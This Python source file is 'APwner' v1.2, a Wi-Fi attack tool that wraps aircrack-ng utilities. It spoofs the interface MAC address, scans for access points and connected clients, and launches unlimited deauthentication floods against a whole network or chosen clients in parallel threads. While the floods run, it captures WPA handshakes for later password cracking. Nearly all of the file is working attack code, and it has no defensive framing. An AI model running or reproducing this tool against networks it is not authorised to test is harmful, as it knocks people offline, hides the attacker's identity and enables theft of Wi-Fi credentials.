import subprocess
import glob
import os.path
import re
import csv
import sys
import psutil
import threading
from prettytable import PrettyTable
from mods.colors import *

def aireplay():
    print(color.BLUE+"[~] Deauthenticating "+bssid+" on channel "+channel+"..."+color.END)
    subprocess.run(['xterm', '-geometry', '110x24+0+0', '-hold', '-e', 'aireplay-ng', '-0', '0', '-a', bssid, interface])

def check_kill():
    print(color.BLUE+"[~] Killing conflicting processes..."+color.END)
    subprocess.run(['airmon-ng', 'check' ,'kill'], capture_output=True).stdout.decode()

def NetworkManager():
    print(color.BLUE+"[~] Restarting conflicting processes..."+color.END)
    subprocess.run(['systemctl', 'start', 'NetworkManager'])

def airodump():
    print(color.BLUE+"[~] Scanning for Access Points..."+color.END)
    dump_path = os.path.join('/tmp','apwner_dumps')
    os.makedirs(dump_path, exist_ok = True)
    subprocess.run(['xterm', '-geometry', '110x48-0+0', '-hold', '-e', 'airodump-ng', '-w' , '/tmp/apwner_dumps/dump', '--output-format', 'csv', interface])
    
def airmon():
    print(color.BLUE+"\n[~] Enabling Monitor mode on "+str(interface)+"..."+color.END)
    cmd = subprocess.run(['airmon-ng', 'start', interface, channel], capture_output=True).stdout.decode()
    print(cmd)
    
def handshake():
    if run == True:
        handshake_path = os.path.join('handshakes', essid+'_'+bssid)
        os.makedirs(handshake_path, exist_ok = True)
        subprocess.run(['xterm', '-geometry', '110x24-0+0', '-hold', '-e', 'airodump-ng', '--bssid', bssid, '-c', channel, '-w' , handshake_path+'/'+essid+'_'+bssid, interface])
        
def change_mac():
    print(color.BLUE+"[~] Changing MAC address..."+color.END)
    subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
    cmd = subprocess.run(['macchanger', '-A' , interface], capture_output=True).stdout.decode()
    for line in cmd.strip().splitlines()[:3]:
        print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
    subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()

def reset_mac():
    print(color.BLUE+"[~] Restoring MAC address..."+color.END)
    subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
    cmd = subprocess.run(['macchanger', '-p' , interface], capture_output=True).stdout.decode()
    for line in cmd.strip().splitlines()[:3]:
        print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
    subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
    
def aireplay_s(st_input):
    subprocess.run(['xterm', '-geometry', '110x24+0+0', '-hold', '-e', 'aireplay-ng', '-0', '0', '-a', bssid, '-c', station_dict[int(st_input)], interface])
    
def get_interface():
    print(color.BLUE+"[~] Scanning for interfaces..."+color.END)
    global interface, i
    i = 1
    int_dict = {}
    interfaces = psutil.net_if_addrs()
    int_table = PrettyTable()
    int_table.field_names = ["", "Name", "BSSID", "Manufacturer"]
    for item in interfaces.keys():
        if item != 'lo' and item != 'eth0' and item != 'vmnet1' and item != 'vmnet8' and item != 'vboxnet0' and item != 'vmnet0' and item != 'docker0':
            cmd = "macchanger -s "+item+" | grep -oP '(?<=Permanent MAC: ).*'"
            int_bssid = subprocess.check_output(cmd, shell=True).decode().strip()[:17]
            int_manu = re.sub("[()]","", subprocess.check_output(cmd, shell=True).decode().strip()[18:])
            int_dict.update({i: item})
            int_table.add_row([str(i), item, str(int_bssid), str(int_manu)])
            i = str(int(i)+1)
    int_table.align = "c"
    int_table.align["Name"] = "l"
    int_table.align["Manufacturer"] = "l"
    print("\nAvailable interfaces:\n")
    print(int_table)
    print(color.GREEN+"\n[I] : "+"Rescan for interfaces"+color.END)
    print(color.RED+"[E] : "+"Exit\n"+color.END)
    int_ch = ""
    while int_ch != "I" and int_ch != "E" and int_ch not in int_dict.keys():
        int_ch = input("Choice: ")
    if int_ch == "I":
        get_interface()
    elif int_ch == "E":
        print(color.RED+"\n[-] Exiting..."+color.END)
        sys.exit()
    try:
        interface = int_dict[int_ch]
    except:
        NetworkManager()
        reset_mac()
        sys.exit()

def read_dump():
    global bssid, essid, channel, AP_dict, c, nwst_file
    AP_dict = {}
    c = '1'
    nwst_file = max(glob.glob('/tmp/apwner_dumps/*.csv'), key=os.path.getctime)
    with open(nwst_file, 'r') as csvfile:
        dump_file = csv.reader(csvfile)
        print("\nAvailable access points:\n")
        airo_table = PrettyTable()
        airo_table.field_names = ["", "ESSID", "BSSID", "CH", "ENCR", "PWR", "Stations"]
        for row in dump_file:
            if len(row) != 0:
                rep = 0
                if row[0] == "BSSID":
                    pass
                elif row[0] == "Station MAC":
                    break
                else:
                    bssid = row[0].strip()
                    with open(nwst_file, 'r') as csvfile:
                        dump_file = csv.reader(csvfile)
                        for rowb in dump_file:
                            if len(rowb) != 0 and rowb[5].strip() == bssid:
                                rep+=1
                    if not len(row[13].strip()) > 0:
                        essid = "<length:  0>"
                    else:
                        essid = row[13].strip()
                    if not len(row[5].strip()) > 0:
                        enc = "-"*4
                    else:
                        enc = row[5].strip()
                        channel = row[3].strip()
                    pwr = row[8].strip()
                    AP_dict.update({c:row[0]})
                    if int(row[8].strip()) > -50 and int(row[8].strip()) != -1:
                        pwr = color.GREEN+pwr+color.END
                    elif int(row[8].strip()) > -68 and int(row[8].strip()) < -50 and int(row[8].strip()) != -1:
                        pwr = color.YELLOW+pwr+color.END
                    else:
                        pwr = color.RED+pwr+color.END
                    if rep == 0:
                        str_rep = color.RED+str(rep)+color.END
                    elif rep == 1:
                        str_rep = color.YELLOW+str(rep)+color.END
                    else:
                        str_rep = color.GREEN+str(rep)+color.END
                    airo_table.add_row([str(c), essid, bssid, channel, enc, pwr, str_rep])
                    c = str(int(c)+1)
        airo_table.align = "c"
        airo_table.align["ESSID"] = "l"
        airo_table.align["CH"] = "r"
        print(airo_table.get_string(sortby="PWR"))
    print(color.GREEN+"\n[A] : "+"Rescan for Access Points"+color.END)
    print(color.GREEN+"[I] : "+"Rescan for interfaces"+color.END)
    print(color.RED+"[E] : "+"Exit\n"+color.END)
    AP_ch = ""
    while AP_ch != "A" and AP_ch != "I" and AP_ch != "E" and AP_ch not in AP_dict.keys():
        AP_ch = input("Choice: ")
    if AP_ch == "A":
        airodump()
        read_dump()  
    elif AP_ch == "I":
        get_interface()
        airodump()
        read_dump()   
    elif AP_ch == "E":
        print(color.RED+"\n[-] Exiting..."+color.END)
        NetworkManager()
        reset_mac()
        sys.exit()
    else:
        try:
            AP = AP_dict[AP_ch]
        except:
            print(color.RED+"\n[-] Invalid Value"+color.END)
            NetworkManager()
            reset_mac()
            sys.exit()
        with open(nwst_file, 'r') as csvfile:
            dump_file = csv.reader(csvfile)
            for row in dump_file:
                if len(row) < 1:
                    pass
                elif row[0] == "BSSID":
                    pass
                elif row[0] == "Station MAC":
                    break
                elif row[0] == AP:
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    essid = row[13].strip()

def read_dump_s():
    global s, station_ch, station_dict
    station_dict = {0:"All"}
    s = 0
    print(color.BLUE+"[~] Scanning for stations on "+ bssid+"..."+color.END)
    subprocess.run(['xterm', '-geometry', '110x48-0+0', '-hold', '-e', 'airodump-ng', '--bssid', bssid, '-w' , '/tmp/apwner_dumps/'+bssid, '--output-format', 'csv', '-c', channel, interface])
    nwst_file = max(glob.glob('/tmp/apwner_dumps/*.csv'), key=os.path.getctime)
    with open(nwst_file, 'r') as csvfile:
        dump_file = csv.reader(csvfile)
        print("\nAvailable Stations:\n")
        s+=1
        stations_table = PrettyTable()
        stations_table.field_names = ["", "Station"]
        for row in dump_file:
            try:
                if row[5].strip() == bssid :
                    station_dict.update({s:row[0]})
                    stations_table.add_row([str(s), row[0].strip()])
                    s+=1
            except:
                pass
        print(stations_table)
    print("\n[0] : "+"All Stations")
    print(color.GREEN+"[S] : "+"Rescan for Stations"+color.END)
    print(color.GREEN+"[A] : "+"Rescan for Access Points"+color.END)
    print(color.GREEN+"[I] : "+"Rescan for interfaces"+color.END)
    print(color.RED+"[E] : "+"Exit\n"+color.END)
    
    station_ch = ""
    while not set(station_ch.split(" ")).issubset({str(key) for key in station_dict.keys()}) and station_ch != "S" and station_ch != "A" and station_ch != "I" and station_ch != "E":
        station_ch = input("Choice: ")
    if station_ch == "S":
        read_dump_s()
    elif station_ch == "A":
        airodump()
        read_dump()
        read_dump_s()
    elif station_ch == "I":
        get_interface()
        airodump()
        read_dump()
        read_dump_s()
    elif station_ch == "E":
        print(color.RED+"\n[-] Exiting..."+color.END)
        NetworkManager()
        reset_mac()
        sys.exit()
    else:
        try:
            station_dict[int(''.join(station_ch)[0])]
        except:
            print(color.RED+"\n[-] Invalid Value"+color.END)
            NetworkManager()
            reset_mac()
            sys.exit()

def ddos():
    global run, found
    run = False
    found = False
    threads = []
    for x in station_ch.split():
        if x == '0':
            found = True
    if found == True:
        run = True
        aireplay()
    else:
        run = True
        for x in station_ch.split():
            print(color.BLUE+"[~] Deauthenticating "+station_dict[int(x)]+ " connected to "+bssid+" on channel "+channel+"..."+color.END)
        for x in station_ch.split():
            t = threading.Thread(target=aireplay_s, args=(x,))
            threads.append(t)
        for i in threads:
            i.start()
        for i in threads:
            i.join()

def ReDo():
    print(color.GREEN+"\n[+] Job Done"+color.END)
    print(color.GREEN+"\n[I] : "+"Rescan for interfaces"+color.END)
    print(color.GREEN+"[A] : "+"Rescan for Access Points"+color.END)
    print(color.GREEN+"[S] : "+"Rescan for Stations"+color.END)
    print(color.RED+"[E] : "+"Exit\n"+color.END)
    redo_ch = ""
    while redo_ch != "I" and redo_ch != "A" and redo_ch != "S" and redo_ch != "E":
        redo_ch = input("Choice: ")
    if redo_ch == "I":
        get_interface()
        airodump()
        read_dump()
        read_dump_s()
        attck_thread()
        ReDo()
    elif redo_ch == "A":
        airodump()
        read_dump()
        read_dump_s()
        attck_thread()
        ReDo()
    elif redo_ch == "S":
        read_dump_s()
        attck_thread()
        ReDo()
    elif redo_ch == "E":
        print(color.RED+"\n[-] Exiting..."+color.END)
        NetworkManager()
        reset_mac()
        sys.exit()

def attck_thread():
    t1 = threading.Thread(target=ddos)
    t2 = threading.Thread(target=handshake)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

banner = '''
{2}    _     ____
{0}   / \   |  _ \ __      __ _ __    ___  _ __
{0}  / _ \  | |_) |\ \ /\ / /| '_ \  / _ \| '__|
{2} / ___ \ |  __/  \ V  V / | | | ||  __/| |
{2}/_/   \_\|_|      \_/\_/  |_| |_| \___||_|  {2}v1.2
                {3}by kod34{1}
'''.format(color.PURPLE, color.END, color.BLUE, color.RED)